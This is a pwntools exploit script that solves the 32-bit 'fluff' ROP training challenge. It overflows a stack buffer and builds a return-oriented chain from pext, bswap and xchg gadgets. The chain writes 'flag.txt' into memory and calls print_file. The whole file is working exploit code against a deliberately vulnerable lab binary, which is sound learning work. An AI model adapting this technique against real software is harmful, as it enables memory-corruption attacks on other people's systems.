import time
from typing import List

from pwn import *


EXECUTABLE = "./fluff32"
context.binary = elf = ELF(EXECUTABLE)
lib_fluff = ELF("./libfluff32.so")


p = process(EXECUTABLE)
if args.GDB:
    gdb.attach(p)

OFFSET = 44
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128))

    time.sleep(1)
    core = Coredump("./core")
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(core.fault_addr)}")
    offset = cyclic_find(core.fault_addr)
    log.success(f"Offset found: {offset}")
    exit()

flag_addr = elf.symbols.data_start
file_name = b"flag.txt"


rop = ROP(elf)

# Place string in memory
for (i, c) in enumerate(file_name):
    # Load flag addres into ecx
    # Note: Need to reverse endianness for this
    # https://www.felixcloutier.com/x86/bswap
    rop.raw(elf.symbols.questionableGadgets + 0x15) # pop ecx; bswap ecx; ret;
    rop.raw(pack(flag_addr + i, endianness="big"))

    # Create mask for the pext instruction
    # https://www.felixcloutier.com/x86/pext
    source = 0xb0bababa
    mask   = 0x0
    value  = c
    for m, src_bit in enumerate(reversed(bin(source)[2:])):
        src_bit = int(src_bit)
        next_value = value & 1
        if src_bit == next_value:
            mask |= (1 << m)
            value >>= 1

    # Load character into dl (=edx)
    rop(ebp=mask)
    # mov eax, ebp;
    # mov ebx, 0xb0bababa;
    # pext edx, ebx, eax;
    # mov eax, 0xdeadbeef;
    # ret;
    rop.raw(elf.symbols.questionableGadgets)

    # Load
    # https://www.felixcloutier.com/x86/xchg
    rop.raw(elf.symbols.questionableGadgets + 0x12) # xchg byte [ecx], dl; ret;

# Call print_file
rop.print_file(flag_addr)


log.debug("Sending rop chain:\n" + rop.dump())
p.sendafter(b"> ", flat({ OFFSET: rop.chain() }))
p.recvline() # Thank you

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
